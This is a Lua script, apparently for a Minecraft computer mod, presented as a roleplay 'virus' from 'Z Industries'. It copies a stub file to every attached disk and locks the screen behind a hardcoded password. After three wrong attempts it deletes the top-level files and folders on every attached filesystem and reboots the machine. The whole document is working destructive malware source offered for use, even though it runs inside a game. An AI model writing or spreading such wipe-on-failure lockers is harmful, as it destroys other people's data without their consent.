-- Z Industries Virus RP
local term = require("term")
local computer = require("computer")
local filesystem = require("filesystem")
local component = require("component")
local event = require("event")

local PASSWORD = "ZIndustries"
local ATTEMPT_DELAY = 5
local MAX_ATTEMPTS = 3
local attempts = 0

function lockScreen()
  term.clear()
  term.write("=== Système verrouillé par Z Industries ===\n")
  term.write("Entrez le mot de passe pour déverrouiller :\n")
end

function selfDestruct()
  term.clear()
  term.write("[ALERTE] Tentatives excessives détectées\n")
  term.write("Initialisation de l'autodestruction...\n")
  os.sleep(2)

  -- Suppression de tous les fichiers sur tous les disques
  for address in component.list("filesystem") do
    local fs = component.proxy(address)
    if fs then
      for file in fs.list("/") or {} do
        pcall(fs.remove, "/" .. file)
      end
    end
  end

  term.write("Destruction terminée. Adieu.\n")
  os.sleep(3)
  computer.shutdown(true)
end

function copyVirus()
  local fileName = "/home/virus.lua"
  for address in component.list("filesystem") do
    local fs = component.proxy(address)
    if fs and fs.spaceTotal() > 0 then
      pcall(function()
        local handle = fs.open(fileName, "w")
        fs.write(handle, [[-- Virus RP Code
        local term = require("term")
        -- Code supprimé pour éviter les boucles infinies
        term.write("Ce PC appartient désormais à Z Industries\n")
        ]])
        fs.close(handle)
      end)
    end
  end
end

function unlock()
  term.clear()
  term.write("Accès autorisé. Bienvenue dans le système.\n")
  os.exit()
end

function main()
  copyVirus()
  lockScreen()
  while true do
    term.write("> ")
    local input = term.read()
    if input then
      input = input:gsub("\n", "")
      if input == PASSWORD then
        unlock()
      else
        attempts = attempts + 1
        term.write("Mot de passe incorrect !\n")
        if attempts >= MAX_ATTEMPTS then
          selfDestruct()
        end
        os.sleep(ATTEMPT_DELAY)
        lockScreen()
      end
    end
  end
end

main()
